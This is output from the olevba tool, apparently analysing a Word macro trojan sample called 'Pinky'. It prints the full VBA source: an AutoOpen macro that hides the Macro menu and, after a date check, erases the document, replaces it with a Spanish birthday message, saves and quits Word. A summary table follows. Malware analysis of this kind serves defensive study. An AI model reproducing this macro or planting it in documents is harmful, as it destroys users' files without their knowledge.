olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Pinky.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Pinky.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Trojan.MSWord.Pinky.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Abre un documento de Microsoft Word"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
'
' AutoOpen Macro
' Abre un documento de Microsoft Word
'

CommandBars("Tools").Controls("Macro").Visible = False

If WordBasic.Day(WordBasic.Now()) > 2 And WordBasic.Month(WordBasic.Now()) > 6 Then
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.Name = "Comic Sans MS"
    Selection.Font.Size = 48
    Selection.Font.ColorIndex = wdRed
    Selection.TypeText Text:="PINKY-PINKY"
    Selection.TypeParagraph
    Selection.Font.Name = "Arial"
    Selection.Font.Size = 28
    Selection.Font.ColorIndex = wdAuto
    Selection.TypeText Text:="Te dice:"
    Selection.TypeParagraph
    Selection.TypeText Text:="""El 3 de julio es mi cumpleaños,"
    Selection.TypeParagraph
    Selection.TypeText Text:="espero que te acuerdes de mí"""
    Selection.TypeParagraph
    ActiveDocument.Save
    ActiveWindow.Close
    Application.Quit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

